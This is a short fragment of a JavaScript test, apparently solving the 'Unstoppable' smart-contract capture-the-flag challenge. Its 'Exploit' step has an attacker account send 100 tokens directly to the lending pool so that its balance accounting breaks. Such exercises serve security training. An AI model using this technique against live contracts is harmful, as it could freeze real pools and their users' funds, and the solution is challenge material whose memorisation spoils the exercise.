...
describe('[Challenge] Unstoppable', function () {
    ...
    it('Exploit', async function () {
        let evilUser = this.token.connect(attacker);
        await evilUser.transfer(this.pool.address,ethers.utils.parseEther('100'));
        ...
        console.log(ethers.utils.formatEther(poolBalance))
    });
